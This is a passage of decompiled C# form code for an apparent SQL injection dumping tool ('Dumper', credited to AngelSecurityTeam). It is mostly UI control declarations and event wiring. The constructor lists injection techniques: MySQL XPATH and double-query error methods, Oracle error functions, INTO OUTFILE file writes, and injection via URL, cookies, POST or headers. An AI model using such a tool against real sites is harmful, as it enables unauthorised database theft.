		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblCountry")]
	internal virtual ToolStripLabel lblCountry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tpProxies")]
	internal virtual TabPage tpProxies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuAutoScroll
	{
		[CompilerGenerated]
		get
		{
			return _mnuAutoScroll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_144;
			ToolStripMenuItem toolStripMenuItem = _mnuAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAutoScroll = value;
			toolStripMenuItem = _mnuAutoScroll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tscSchemasSP3")]
	internal virtual ToolStripSeparator tscSchemasSP3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tscSchemasSP2")]
	internal virtual ToolStripSeparator tscSchemasSP2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tpMyLoadFile")]
	internal virtual TabPage tpMyLoadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbWriteFile")]
	internal virtual GroupBox grbWriteFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtMySQLWriteFile
	{
		[CompilerGenerated]
		get
		{
			return _txtMySQLWriteFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_148;
			TextBox textBox = _txtMySQLWriteFile;
			if (textBox != null)
			{
				textBox.Leave -= value2;
			}
			_txtMySQLWriteFile = value;
			textBox = _txtMySQLWriteFile;
			if (textBox != null)
			{
				textBox.Leave += value2;
			}
		}
	}

	[field: AccessedThroughProperty("grbLoadFile")]
	internal virtual GroupBox grbLoadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsMySQLReadFile")]
	internal virtual ToolStrip tsMySQLReadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblReadPath")]
	internal virtual ToolStripLabel lblReadPath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripTextBox txtMySQLReadFilePath
	{
		[CompilerGenerated]
		get
		{
			return _txtMySQLReadFilePath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_147;
			ToolStripTextBox toolStripTextBox = _txtMySQLReadFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave -= value2;
			}
			_txtMySQLReadFilePath = value;
			toolStripTextBox = _txtMySQLReadFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave += value2;
			}
		}
	}

	internal virtual ToolStripButton btnMySQLReadFile
	{
		[CompilerGenerated]
		get
		{
			return _btnMySQLReadFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_88;
			ToolStripButton toolStripButton = _btnMySQLReadFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnMySQLReadFile = value;
			toolStripButton = _btnMySQLReadFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tsMySQLWriteFile")]
	internal virtual ToolStrip tsMySQLWriteFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblWritePath")]
	internal virtual ToolStripLabel lblWritePath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripTextBox txtMySQLWriteFilePath
	{
		[CompilerGenerated]
		get
		{
			return _txtMySQLWriteFilePath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_149;
			ToolStripTextBox toolStripTextBox = _txtMySQLWriteFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave -= value2;
			}
			_txtMySQLWriteFilePath = value;
			toolStripTextBox = _txtMySQLWriteFilePath;
			if (toolStripTextBox != null)
			{
				toolStripTextBox.Leave += value2;
			}
		}
	}

	internal virtual ToolStripButton btnMySQLWriteFile
	{
		[CompilerGenerated]
		get
		{
			return _btnMySQLWriteFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_89;
			ToolStripButton toolStripButton = _btnMySQLWriteFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnMySQLWriteFile = value;
			toolStripButton = _btnMySQLWriteFile;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStrip tlsMenu
	{
		[CompilerGenerated]
		get
		{
			return _tlsMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			ToolStripItemClickedEventHandler value2 = method_153;
			ToolStrip toolStrip = _tlsMenu;
			if (toolStrip != null)
			{
				toolStrip.ItemClicked -= value2;
			}
			_tlsMenu = value;
			toolStrip = _tlsMenu;
			if (toolStrip != null)
			{
				toolStrip.ItemClicked += value2;
			}
		}
	}

	internal virtual ToolStripButton btnPasteURL
	{
		[CompilerGenerated]
		get
		{
			return _btnPasteURL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_87;
			ToolStripButton toolStripButton = _btnPasteURL;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnPasteURL = value;
			toolStripButton = _btnPasteURL;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("toolStripSeparator18")]
	internal virtual ToolStripSeparator toolStripSeparator18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripComboBox cmbSqlType
	{
		[CompilerGenerated]
		get
		{
			return _cmbSqlType;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_99;
			EventHandler value3 = method_150;
			MouseEventHandler value4 = method_154;
			ToolStripComboBox toolStripComboBox = _cmbSqlType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged -= value2;
				toolStripComboBox.Click -= value3;
				toolStripComboBox.MouseUp -= value4;
			}
			_cmbSqlType = value;
			toolStripComboBox = _cmbSqlType;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.SelectedIndexChanged += value2;
				toolStripComboBox.Click += value3;
				toolStripComboBox.MouseUp += value4;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator2")]
	internal virtual ToolStripSeparator ToolStripSeparator2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numSleepMultiThread")]
	internal virtual NumericUpDown numSleepMultiThread
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblMultiThreadDelay")]
	internal virtual Label lblMultiThreadDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblMultiThreadRetry")]
	internal virtual Label lblMultiThreadRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numMaxRetryMultiThread")]
	internal virtual NumericUpDown numMaxRetryMultiThread
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numSleep")]
	internal virtual NumericUpDown numSleep
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblThreadDelay")]
	internal virtual Label lblThreadDelay
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblThreadRetry")]
	internal virtual Label lblThreadRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numMaxRetry")]
	internal virtual NumericUpDown numMaxRetry
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numTimeOut")]
	internal virtual NumericUpDown numTimeOut
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblTimout")]
	internal virtual Label lblTimout
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblDumperMaxRows")]
	internal virtual Label lblDumperMaxRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual NumericUpDown numLimitMax
	{
		[CompilerGenerated]
		get
		{
			return _numLimitMax;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_145;
			NumericUpDown numericUpDown = _numLimitMax;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged -= value2;
			}
			_numLimitMax = value;
			numericUpDown = _numLimitMax;
			if (numericUpDown != null)
			{
				numericUpDown.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numLimitX")]
	internal virtual NumericUpDown numLimitX
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblDumperStartIndex")]
	internal virtual Label lblDumperStartIndex
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkDumpWhere
	{
		[CompilerGenerated]
		get
		{
			return _chkDumpWhere;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_119;
			CheckBox checkBox = _chkDumpWhere;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkDumpWhere = value;
			checkBox = _chkDumpWhere;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	internal virtual CheckBox chkDumpOrderBy
	{
		[CompilerGenerated]
		get
		{
			return _chkDumpOrderBy;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_119;
			CheckBox checkBox = _chkDumpOrderBy;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkDumpOrderBy = value;
			checkBox = _chkDumpOrderBy;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblDumperRetryColumn")]
	internal virtual Label lblDumperRetryColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkDumpIFNULL")]
	internal virtual CheckBox chkDumpIFNULL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numMaxRetryColumn")]
	internal virtual NumericUpDown numMaxRetryColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkDumpEncodedHex")]
	internal virtual CheckBox chkDumpEncodedHex
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkReDumpFailed")]
	internal virtual CheckBox chkReDumpFailed
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numFieldByField")]
	internal virtual NumericUpDown numFieldByField
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkDumpFieldByField
	{
		[CompilerGenerated]
		get
		{
			return _chkDumpFieldByField;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_140;
			CheckBox checkBox = _chkDumpFieldByField;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkDumpFieldByField = value;
			checkBox = _chkDumpFieldByField;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("pnlSetupDump")]
	internal virtual Panel pnlSetupDump
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbOracleCollactions")]
	internal virtual GroupBox grbOracleCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkOracleCastAsChar")]
	internal virtual CheckBox chkOracleCastAsChar
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbOracleErrType")]
	internal virtual ComboBox cmbOracleErrType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbOracleTopN")]
	internal virtual ComboBox cmbOracleTopN
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbMySQLCollactions")]
	internal virtual GroupBox grbMySQLCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMySQLErrType")]
	internal virtual ComboBox cmbMySQLErrType
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMySQLCollations")]
	internal virtual ComboBox cmbMySQLCollations
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbMSSQLCollactions")]
	internal virtual GroupBox grbMSSQLCollactions
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbDumpSetup2")]
	internal virtual GroupBox grbDumpSetup2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbDumpSetup")]
	internal virtual GroupBox grbDumpSetup
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbSetupCon")]
	internal virtual GroupBox grbSetupCon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkThreads")]
	internal virtual CheckBox chkThreads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numThreads")]
	internal virtual NumericUpDown numThreads
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pnlSetupDump2")]
	internal virtual Panel pnlSetupDump2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbInjectionPoint")]
	internal virtual GroupBox grbInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAddHearder")]
	internal virtual CheckBox chkAddHearder
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHeaderValue")]
	internal virtual Label lblHeaderValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtAddHeaderValue")]
	internal virtual TextBox txtAddHeaderValue
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblHeaderName")]
	internal virtual Label lblHeaderName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtAddHeaderName")]
	internal virtual TextBox txtAddHeaderName
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblInjectionPointMethod")]
	internal virtual Label lblInjectionPointMethod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblInjectionPoint")]
	internal virtual Label lblInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbInjectionPoint")]
	internal virtual ComboBox cmbInjectionPoint
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMethod")]
	internal virtual ComboBox cmbMethod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtCookies")]
	internal virtual TextBox txtCookies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtPost")]
	internal virtual TextBox txtPost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblPost")]
	internal virtual Label lblPost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblCookies")]
	internal virtual Label lblCookies
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("grbLogin")]
	internal virtual GroupBox grbLogin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtUserName
	{
		[CompilerGenerated]
		get
		{
			return _txtUserName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_152;
			TextBox textBox = _txtUserName;
			if (textBox != null)
			{
				textBox.Leave -= value2;
			}
			_txtUserName = value;
			textBox = _txtUserName;
			if (textBox != null)
			{
				textBox.Leave += value2;
			}
		}
	}

	internal virtual TextBox txtPassword
	{
		[CompilerGenerated]
		get
		{
			return _txtPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_152;
			TextBox textBox = _txtPassword;
			if (textBox != null)
			{
				textBox.Leave -= value2;
			}
			_txtPassword = value;
			textBox = _txtPassword;
			if (textBox != null)
			{
				textBox.Leave += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblLoginUser")]
	internal virtual Label lblLoginUser
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblLoginPassword")]
	internal virtual Label lblLoginPassword
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkHttpRedirect")]
	internal virtual CheckBox chkHttpRedirect
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMySQLWriteFilePath")]
	internal virtual ToolStripComboBox cmbMySQLWriteFilePath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator3")]
	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator4")]
	internal virtual ToolStripSeparator ToolStripSeparator4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cmbMySQLReadFile")]
	internal virtual ToolStripComboBox cmbMySQLReadFile
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator6")]
	internal virtual ToolStripSeparator ToolStripSeparator6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsNewDumpBtn")]
	internal virtual ToolStrip tsNewDumpBtn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnLoadDefautSettings
	{
		[CompilerGenerated]
		get
		{
			return _btnLoadDefautSettings;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_143;
			ToolStripButton toolStripButton = _btnLoadDefautSettings;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnLoadDefautSettings = value;
			toolStripButton = _btnLoadDefautSettings;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ToolStripButton btnLoadNewDumper
	{
		[CompilerGenerated]
		get
		{
			return _btnLoadNewDumper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_146;
			ToolStripButton toolStripButton = _btnLoadNewDumper;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnLoadNewDumper = value;
			toolStripButton = _btnLoadNewDumper;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	internal virtual ImageList imlTabs
	{
		[CompilerGenerated]
		get
		{
			return imageList_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			imageList_1 = value;
		}
	}

	[field: AccessedThroughProperty("grbMySQLSplitRows")]
	internal virtual GroupBox grbMySQLSplitRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numMySQLSplitRowsLenght")]
	internal virtual NumericUpDown numMySQLSplitRowsLenght
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual CheckBox chkMySQLSplitRows
	{
		[CompilerGenerated]
		get
		{
			return _chkMySQLSplitRows;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_155;
			CheckBox checkBox = _chkMySQLSplitRows;
			if (checkBox != null)
			{
				checkBox.CheckedChanged -= value2;
			}
			_chkMySQLSplitRows = value;
			checkBox = _chkMySQLSplitRows;
			if (checkBox != null)
			{
				checkBox.CheckedChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("numMySQLSplitRows")]
	internal virtual NumericUpDown numMySQLSplitRows
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tpSearch")]
	internal virtual TabPage tpSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("tsSearchColumn")]
	internal virtual ToolStrip tsSearchColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator7")]
	internal virtual ToolStripSeparator ToolStripSeparator7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkSearchColumnAllDBs")]
	internal virtual ToolStripButton chkSearchColumnAllDBs
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripSeparator8")]
	internal virtual ToolStripSeparator ToolStripSeparator8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripButton btnSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return _btnSearchColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_156;
			ToolStripButton toolStripButton = _btnSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.Click -= value2;
			}
			_btnSearchColumn = value;
			toolStripButton = _btnSearchColumn;
			if (toolStripButton != null)
			{
				toolStripButton.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("txtSearchColumnResult")]
	internal virtual TextBox txtSearchColumnResult
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripComboBox txtSearchColumn
	{
		[CompilerGenerated]
		get
		{
			return _txtSearchColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_157;
			EventHandler value3 = method_158;
			ToolStripComboBox toolStripComboBox = _txtSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave -= value2;
				toolStripComboBox.TextChanged -= value3;
			}
			_txtSearchColumn = value;
			toolStripComboBox = _txtSearchColumn;
			if (toolStripComboBox != null)
			{
				toolStripComboBox.Leave += value2;
				toolStripComboBox.TextChanged += value3;
			}
		}
	}

	internal virtual ToolStripSpringTextBox txtURL
	{
		[CompilerGenerated]
		get
		{
			return toolStripSpringTextBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_98;
			ToolStripSpringTextBox toolStripSpringTextBox = toolStripSpringTextBox_0;
			if (toolStripSpringTextBox != null)
			{
				toolStripSpringTextBox.TextChanged -= value2;
			}
			toolStripSpringTextBox_0 = value;
			toolStripSpringTextBox = toolStripSpringTextBox_0;
			if (toolStripSpringTextBox != null)
			{
				toolStripSpringTextBox.TextChanged += value2;
			}
		}
	}

	internal string String_0 => string_0;

	internal bool Boolean_0 => bool_2;

	internal int Int32_0
	{
		get
		{
			if (dumpLoading_0 != null)
			{
				if (dumpLoading_0.prgStatus.Style == ProgressBarStyle.Marquee)
				{
					return 0;
				}
				return dumpLoading_0.prgStatus.Value;
			}
			return 0;
		}
	}

	internal int Int32_1
	{
		get
		{
			if (threadPool_0 != null)
			{
				return threadPool_0.ThreadCount;
			}
			return 0;
		}
	}

	internal AppDomainControl AppDomainControl_0 => appDomainControl_0;

	public Dumper()
	{
		base.Load += Dumper_Load;
		base.FormClosing += Dumper_FormClosing;
		string_0 = "";
		string_2 = "retry limit exceeded";
		string_3 = "canceled - AngelSecurityTeam";
		string_4 = "Loading please wait..";
		list_1 = new List<DumpGrid>();
		InitializeComponent();
		grbInjectionPoint.Visible = false;
		cmbSqlType.Items.Add(Class54.smethod_5(Types.MySQL_No_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.MySQL_With_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.MSSQL_No_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.MSSQL_With_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.Oracle_No_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.Oracle_With_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.PostgreSQL_No_Error));
		cmbSqlType.Items.Add(Class54.smethod_5(Types.PostgreSQL_With_Error));
		cmbSqlType.SelectedIndex = 0;
		cmbMySQLCollations.Items.AddRange(new string[8] { "None", "Unhex(Hex())", "Binary()", "Cast As Char", "Compress(Uncompress())", "Convert Using utf8", "Convert Using latin1", "Aes_decrypt(Aes_encrypt())" });
		cmbMySQLCollations.SelectedIndex = 1;
		cmbMySQLErrType.Items.AddRange(new string[3] { "XPATH - UpdateXML", "Double Query", "XPATH - ExtractValue" });
		cmbMySQLErrType.SelectedIndex = 1;
		cmbOracleTopN.Items.AddRange(new string[3] { "ROWNUM", "RANK()", "DENSE_RANK()" });
		cmbOracleTopN.SelectedIndex = 0;
		cmbOracleErrType.Items.AddRange(new string[3] { "GET_HOST_ADDRESS", "DRITHSX.SN", "GETMAPPINGXPATH" });
		cmbOracleErrType.SelectedIndex = 0;
		cmbMSSQLCast.Items.AddRange(new string[8] { "nvarchar", "nvarchar(4000)", "char", "char(4000)", "varchar", "varchar(4000)", "nchar", "nchar(4000)" });
		cmbMSSQLCast.SelectedIndex = 0;
		cmbMySQLWriteFilePath.Items.AddRange(new string[2] { "INTO OUTFILE", "INTO DUMPFILE" });
		cmbMySQLWriteFilePath.SelectedIndex = 0;
		cmbMySQLReadFile.Items.AddRange(new string[3] { "NONE", "HEX", "CHAR" });
		cmbMySQLReadFile.SelectedIndex = 1;
		_ = 0;
		lblVersion.Text = "";
		lblCountry.Text = "";
		tabControlExt_0 = new TabControlExt();
		splData.Panel2.Controls.Add(tabControlExt_0);
		tabControlExt_0.BorderColorDisabled = SystemColors.Control;
		tabControlExt_0.Dock = DockStyle.Fill;
		tabControlExt_0.Font = new Font("Courier New", 8f, FontStyle.Regular);
		checked
		{
			tabControlExt_0.TabHeight -= 7;
			tabControlExt_0.GetBackground().MouseDown += Globals.AddMouseMove;
			tabControlExt_0.pnlTabs.MouseDown += Globals.AddMouseMove;
			tabControlExt_0.TabPages.OnVisibleChanged += method_38;
			splData.Panel2Collapsed = true;
			cmbMethod.Items.Add("GET");
			cmbMethod.Items.Add("POST");
			cmbMethod.Text = Conversions.ToString(cmbMethod.Items[0]);
			cmbInjectionPoint.Items.Add("URL");
			cmbInjectionPoint.Items.Add("Cookies");
			cmbInjectionPoint.Items.Add("POST");
			cmbInjectionPoint.Items.Add("Added Header");
			cmbInjectionPoint.Text = Conversions.ToString(cmbInjectionPoint.Items[0]);
			cmbMSSQLCast.Items.Add("nvarchar");
			cmbMSSQLCast.Items.Add("nvarchar(4000)");
			cmbMSSQLCast.Items.Add("char");
			cmbMSSQLCast.Items.Add("char(4000)");
			cmbMSSQLCast.Items.Add("varchar");
			cmbMSSQLCast.Items.Add("varchar(4000)");
			cmbMSSQLCast.Items.Add("nchar");
			cmbMSSQLCast.Items.Add("nchar(4000)");
			cmbMSSQLCast.SelectedIndex = 0;
			tabControlExt_0.RenderMode = ToolStripRenderMode.System;
			btnDataBases.Image = imgTV.Images[0];
			btnTables.Image = imgTV.Images[1];
